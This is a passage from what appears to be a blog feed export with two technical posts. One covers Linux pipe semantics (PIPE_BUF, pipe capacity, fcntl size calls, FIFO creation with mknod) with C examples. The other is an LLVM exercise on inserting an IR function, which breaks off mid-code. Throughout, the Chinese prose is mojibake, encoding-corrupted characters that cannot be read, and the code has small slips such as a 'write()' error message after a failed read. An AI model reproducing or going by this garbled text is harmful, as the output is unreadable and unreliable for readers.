¸åœ¨å¤„ç†ç®¡é“çš„æ—¶å€™ï¼Œå¦‚æœæ¯æ¬¡è¯»å†™æ“ä½œçš„æ•°æ®é•¿åº¦ä¸å¤§äºPIPEBUFæ—¶ï¼Œä¿è¯å…¶æ“ä½œæ˜¯åŸå­çš„ã€‚è€ŒPIPESIZEçš„å½±å“æ˜¯ï¼Œå¤§äºå…¶é•¿åº¦çš„å†™æ“ä½œä¼šè¢«é˜»å¡ï¼Œç›´åˆ°å½“å‰ç®¡é“ä¸­çš„æ•°æ®è¢«è¯»å–ä¸ºæ­¢ã€‚</p><p>åœ¨Linux 2.6.11ä¹‹å‰ï¼ŒPIPESIZEå’ŒPIPEBUFå®é™…ä¸Šæ˜¯ä¸€æ ·çš„ã€‚åœ¨è¿™ä¹‹åï¼ŒLinuxé‡æ–°å®ç°äº†ä¸€ä¸ªç®¡é“ç¼“å­˜ï¼Œå¹¶å°†å®ƒä¸å†™æ“ä½œçš„PIPEBUFå®ç°æˆäº†ä¸åŒçš„æ¦‚å¿µï¼Œå½¢æˆäº†ä¸€ä¸ªé»˜è®¤é•¿åº¦ä¸º65536å­—èŠ‚çš„PIPESIZEï¼Œè€ŒPIPEBUFåªå½±å“ç›¸å…³è¯»å†™æ“ä½œçš„åŸå­æ€§ã€‚ä»Linux 2.6.35ä¹‹åï¼Œåœ¨fcntlç³»ç»Ÿè°ƒç”¨æ–¹æ³•ä¸­å®ç°äº†F_GETPIPE_SZå’ŒF_SETPIPE_SZæ“ä½œï¼Œæ¥åˆ†åˆ«æŸ¥çœ‹å½“å‰ç®¡é“å®¹é‡å’Œè®¾ç½®ç®¡é“å®¹é‡ã€‚ç®¡é“å®¹é‡å®¹é‡ä¸Šé™å¯ä»¥åœ¨/proc/sys/fs/pipe-max-sizeè¿›è¡Œè®¾ç½®ã€‚</p><pre class="language-js" data-language="js"><code class="language-js">#define <span class="token constant">BUFSIZE</span> <span class="token number">65536</span><span class="token operator">...</span><span class="token operator">...</span>ret <span class="token operator">=</span> <span class="token function">fcntl</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">F_GETPIPE_SZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fcntl()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PIPESIZE: %d\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token function">fcntl</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">F_SETPIPE_SZ</span><span class="token punctuation">,</span> <span class="token constant">BUFSIZE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fcntl()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span></code></pre><p>PIPEBUFå’ŒPIPESIZEå¯¹ç®¡é“æ“ä½œçš„å½±å“ä¼šå› ä¸ºç®¡é“æè¿°ç¬¦æ˜¯å¦è¢«è®¾ç½®ä¸ºéé˜»å¡æ–¹å¼è€Œæœ‰è¡Œä¸ºå˜åŒ–ï¼Œnä¸ºè¦å†™å…¥çš„æ•°æ®é‡æ—¶å…·ä½“ä¸ºï¼š</p><p>O_NONBLOCKå…³é—­ï¼Œn &lt;= PIPE_BUFï¼š</p><p>nä¸ªå­—èŠ‚çš„å†™å…¥æ“ä½œæ˜¯åŸå­æ“ä½œï¼Œwriteç³»ç»Ÿè°ƒç”¨å¯èƒ½ä¼šå› ä¸ºç®¡é“å®¹é‡(PIPESIZE)æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´å­˜æ”¾nå­—èŠ‚é•¿åº¦è€Œé˜»å¡ã€‚</p><p>O_NONBLOCKæ‰“å¼€ï¼Œn &lt;= PIPE_BUFï¼š</p><p>å¦‚æœæœ‰è¶³å¤Ÿçš„ç©ºé—´å­˜æ”¾nå­—èŠ‚é•¿åº¦ï¼Œwriteè°ƒç”¨ä¼šç«‹å³è¿”å›æˆåŠŸï¼Œå¹¶ä¸”å¯¹æ•°æ®è¿›è¡Œå†™æ“ä½œã€‚ç©ºé—´ä¸å¤Ÿåˆ™ç«‹å³æŠ¥é”™è¿”å›ï¼Œå¹¶ä¸”errnoè¢«è®¾ç½®ä¸ºEAGAINã€‚</p><p>O_NONBLOCKå…³é—­ï¼Œn &gt; PIPE_BUFï¼š</p><p>å¯¹nå­—èŠ‚çš„å†™å…¥æ“ä½œä¸ä¿è¯æ˜¯åŸå­çš„ï¼Œå°±æ˜¯è¯´è¿™æ¬¡å†™å…¥æ“ä½œçš„æ•°æ®å¯èƒ½ä¼šè·Ÿå…¶ä»–è¿›ç¨‹å†™è¿™ä¸ªç®¡é“çš„æ•°æ®è¿›è¡Œäº¤å‰ã€‚å½“ç®¡é“å®¹é‡é•¿åº¦ä½äºè¦å†™çš„æ•°æ®é•¿åº¦çš„æ—¶å€™writeæ“ä½œä¼šè¢«é˜»å¡ã€‚</p><p>O_NONBLOCKæ‰“å¼€ï¼Œn &gt; PIPE_BUFï¼š</p><p>å¦‚æœç®¡é“ç©ºé—´å·²æ»¡ã€‚writeè°ƒç”¨æŠ¥é”™è¿”å›å¹¶ä¸”errnoè¢«è®¾ç½®ä¸ºEAGAINã€‚å¦‚æœæ²¡æ»¡ï¼Œåˆ™å¯èƒ½ä¼šå†™å…¥ä»1åˆ°nä¸ªå­—èŠ‚é•¿åº¦ï¼Œè¿™å–å†³äºå½“å‰ç®¡é“çš„å‰©ä½™ç©ºé—´é•¿åº¦ï¼Œå¹¶ä¸”è¿™äº›æ•°æ®å¯èƒ½è·Ÿåˆ«çš„è¿›ç¨‹çš„æ•°æ®æœ‰äº¤å‰ã€‚</p><p>ä»¥ä¸Šæ˜¯åœ¨ä½¿ç”¨åŠåŒå·¥ç®¡é“çš„æ—¶å€™è¦æ³¨æ„çš„äº‹æƒ…ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç®¡é“çš„ä¸¤ç«¯éƒ½å¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹è¿›è¡Œè¯»å†™å¤„ç†ã€‚å¦‚æœå†åŠ ä¸Šçº¿ç¨‹ï¼Œåˆ™äº‹æƒ…å¯èƒ½å˜å¾—æ›´å¤æ‚ã€‚å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ç®¡é“çš„æ—¶å€™ï¼Œå¹¶ä¸æ¨èè¿™æ ·æ¥ç”¨ã€‚ç®¡é“æ¨èçš„ä½¿ç”¨æ–¹æ³•æ˜¯å…¶å•å·¥æ¨¡å¼ï¼šå³åªæœ‰ä¸¤ä¸ªè¿›ç¨‹é€šä¿¡ï¼Œä¸€ä¸ªè¿›ç¨‹åªå†™ç®¡é“ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹åªè¯»ç®¡é“ã€‚å®ç°ä¸ºï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ cat pipe_parent_child2<span class="token punctuation">.</span>c#include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>string<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>types<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>wait<span class="token punctuation">.</span>h<span class="token operator">></span>#define <span class="token constant">STRING</span> <span class="token string">"hello world!"</span>int <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    int pipefd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    pid_t pid<span class="token punctuation">;</span>    char buf<span class="token punctuation">[</span><span class="token constant">BUFSIZ</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"pipe()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/* this is child. */</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Child pid is: %d\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/* this is parent */</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Parent pid is: %d\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">snprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token constant">BUFSIZ</span><span class="token punctuation">,</span> <span class="token string">"Message from parent: My pid is: %d"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™ä¸ªç¨‹åºå®é™…ä¸Šæ¯”ä¸Šä¸€ä¸ªè¦ç®€å•ï¼Œçˆ¶è¿›ç¨‹å…³é—­ç®¡é“çš„è¯»ç«¯ï¼Œåªå†™ç®¡é“ã€‚å­è¿›ç¨‹å…³é—­ç®¡é“çš„å†™ç«¯ï¼Œåªè¯»ç®¡é“ã€‚æ•´ä¸ªç®¡é“çš„æ‰“å¼€æ•ˆæœæœ€åæˆä¸ºä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/05/25/fvt6RUli1AeWwL3.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/fvt6RUli1AeWwL3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>æ­¤æ—¶ä¸¤ä¸ªè¿›ç¨‹å°±åªç”¨ç®¡é“å®ç°äº†ä¸€ä¸ªå•å·¥é€šä¿¡ï¼Œå¹¶ä¸”è¿™ç§çŠ¶æ€ä¸‹ä¸ç”¨è€ƒè™‘å¤šä¸ªè¿›ç¨‹åŒæ—¶å¯¹ç®¡é“å†™äº§ç”Ÿçš„æ•°æ®äº¤å‰çš„é—®é¢˜ï¼Œè¿™æ˜¯æœ€ç»å…¸çš„ç®¡é“æ‰“å¼€æ–¹å¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æ¨èçš„ç®¡é“ä½¿ç”¨æ–¹å¼ã€‚å¦å¤–ï¼Œä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜ï¼Œå³ä½¿æˆ‘ä»¬äº†è§£äº†Linuxç®¡é“çš„å®ç°ï¼Œæˆ‘ä»¬çš„ä»£ç ä¹Ÿä¸èƒ½ä¾èµ–å…¶ç‰¹æ€§ï¼Œæ‰€ä»¥å¤„ç†ç®¡é“æ—¶è¯¥è¶Šç•Œåˆ¤æ–­è¿˜æ˜¯è¦åˆ¤æ–­ï¼Œè¯¥é”™è¯¯æ£€æŸ¥è¿˜æ˜¯è¦æ£€æŸ¥ï¼Œè¿™æ ·ä»£ç æ‰èƒ½æ›´å¥å£®ã€‚</p></div><h2 id="FIFO"><strong>FIFO</strong></h2><div class="story post-story"><p>å‘½åç®¡é“åœ¨åº•å±‚çš„å®ç°è·ŸåŒ¿åç®¡é“å®Œå…¨ä¸€è‡´ï¼ŒåŒºåˆ«åªæ˜¯å‘½åç®¡é“ä¼šæœ‰ä¸€ä¸ªå…¨å±€å¯è§çš„æ–‡ä»¶åä»¥ä¾›åˆ«äººopenæ‰“å¼€ä½¿ç”¨ã€‚å†ç¨‹åºä¸­åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“æ–‡ä»¶çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä½¿ç”¨mkfifoå‡½æ•°ã€‚å¦ä¸€ç§æ˜¯ä½¿ç”¨mknodç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ cat mymkfifo<span class="token punctuation">.</span>c#include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>types<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>stat<span class="token punctuation">.</span>h<span class="token operator">></span>#include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>int <span class="token function">main</span><span class="token punctuation">(</span><span class="token parameter">int argc<span class="token punctuation">,</span> char <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span>stderr<span class="token punctuation">,</span> <span class="token string">"Argument error!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">/*    if (mkfifo(argv[1], 0600) &lt; 0) &#123;        perror("mkfifo()");        exit(1);    &#125;*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mknod</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0600</span><span class="token operator">|</span><span class="token constant">S_IFIFO</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mknod()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºåˆ›å»ºçš„æ–‡ä»¶è·¯å¾„ã€‚åˆ›å»ºå®Œä¹‹åï¼Œå…¶ä»–è¿›ç¨‹å°±å¯ä»¥ä½¿ç”¨open()ã€read()ã€write()æ ‡å‡†æ–‡ä»¶æ“ä½œç­‰æ–¹æ³•è¿›è¡Œä½¿ç”¨äº†ã€‚å…¶ä½™æ‰€æœ‰çš„æ“ä½œè·ŸåŒ¿åç®¡é“ä½¿ç”¨ç±»ä¼¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ— è®ºå‘½åè¿˜æ˜¯åŒ¿åç®¡é“ï¼Œå®ƒçš„æ–‡ä»¶æè¿°éƒ½æ²¡æœ‰åç§»é‡çš„æ¦‚å¿µï¼Œæ‰€ä»¥ä¸èƒ½ç”¨lseekè¿›è¡Œåç§»é‡è°ƒæ•´ã€‚</p><p>å…³äºç®¡é“çš„å…¶å®ƒè®®é¢˜ï¼Œæ¯”å¦‚popenã€pcloseçš„ä½¿ç”¨ç­‰è¯é¢˜ï¼Œã€ŠUNIXç¯å¢ƒé«˜çº§ç¼–ç¨‹ã€‹ä¸­çš„ç›¸å…³ç« èŠ‚å·²ç»è®²çš„å¾ˆæ¸…æ¥šäº†ã€‚å¦‚æœæƒ³å­¦ä¹ è¡¥å……è¿™äº›çŸ¥è¯†ï¼Œè¯·å‚è§æ­¤ä¹¦ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ç®¡é“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM -Learn-Work3</title>
      <link href="/posts/4ebd022f/"/>
      <url>/posts/4ebd022f/</url>
      
        <content type="html"><![CDATA[<h1>LLVM -Learn-Work3</h1><blockquote><p>@2022-05-03 18:54:36</p><p>@sizaif</p><p><img src="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt=""></p></blockquote><blockquote><p><strong>Work3</strong>ï¼šæ’å…¥ä¸€ä¸ªå‡½æ•°å¹¶è°ƒç”¨ã€‚å‡½æ•°ç”¨äºæ£€æŸ¥åŠ æ³•ç»“æœï¼Œå¦‚æœå¤§äº 100ï¼Œåˆ™å–</p><p>ä½™ 100ã€‚æ­¤å‡½æ•°ä¼šä¿®æ”¹åŠ æ³•ç»“æœã€‚(å‡½æ•°æ“ä½œ)</p></blockquote><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//main.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"plz input two numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">size_t</span> bufsize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">char</span><span class="token operator">*</span> buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>bufsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">double</span> f1 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">double</span> f2 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2f + %.2f = %.2f \n"</span><span class="token punctuation">,</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f1<span class="token operator">+</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä¸€-æ€è·¯">ä¸€) æ€è·¯</h2><div class="story post-story"><p>ç¬¬ä¸€ç§ä¸€ç§æ€è·¯ï¼š</p><ol><li><p>åˆ›å»ºä¸€ä¸ªå…¨å±€å˜é‡<code>fdd_res</code>,</p></li><li><p>æ·»åŠ <code>store</code>æŒ‡ä»¤ï¼Œ å°†<code>fadd</code>æŒ‡ä»¤çš„ç»“æœå­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ï¼Œ</p></li><li><p>æ„é€ å‡½æ•°ï¼Œè¯»å–å…¨å±€å˜é‡çš„å€¼ï¼Œå¦‚æœå¤§äº100ï¼Œåˆ™å¯¹100å–ä½™ï¼Œå¦åˆ™ä»€ä¹ˆéƒ½ä¸åš</p></li><li><p>ä¿®æ”¹<code>printf</code>å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºå…¨å±€å˜é‡<code>fadd_res</code></p></li></ol><p>ç¬¬äºŒç§ä¸€ç§æ€è·¯ï¼š</p><ol><li>æ„é€ å‡½æ•°<code>work_fn</code>ï¼Œå…¶å‡½æ•°ä¼ å‚(<code>fadd</code>)çš„ç»“æœå€¼</li><li>å‡½æ•°æ‹¿åˆ°å…¶å€¼ï¼Œåšå–ä½™æ“ä½œï¼Œå¹¶è¿”å›ç»“æœ</li><li>ä¸»å‡½æ•°å­˜å‚¨<code>work_fn</code>è¿”å›ç»“æœï¼Œå¹¶ä¿®æ”¹printfå‡½æ•°çš„å‚æ•°ã€‚</li></ol></div><h2 id="äºŒ-æ€è·¯ä¸€æ‰§è¡Œ">äºŒ) æ€è·¯ä¸€æ‰§è¡Œ</h2><div class="story post-story"><h3 id="2-1-è¯»å–IR">2.1) è¯»å–IR</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">LLVMContext context<span class="token punctuation">;</span>IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">builder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> M<span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>MIRParser<span class="token operator">></span> MIR<span class="token punctuation">;</span>SMDiagnostic Err<span class="token punctuation">;</span><span class="token comment">/** * #include "llvm/IRReader/IRReader.h" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */</span>M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"debug: M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// M->print(llvm::outs(),nullptr);</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-2-æ‰¾åˆ°faddæŒ‡ä»¤ä¸faddåä¸€ä¸ªæŒ‡ä»¤">2.2) æ‰¾åˆ°<code>fadd</code>æŒ‡ä»¤ä¸<code>fadd</code>åä¸€ä¸ªæŒ‡ä»¤</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/**    * 2022-04-26 03:25:52    * TODO:    * è·å–mainå‡½æ•°    * */</span>   <span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/**    * 2022-04-28 02:14:46    * TODO:    * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤    * */</span>   Instruction <span class="token operator">*</span>in_fadd<span class="token punctuation">,</span><span class="token operator">*</span>in_prt<span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span>inst_iterator I <span class="token operator">=</span> <span class="token function">inst_begin</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span 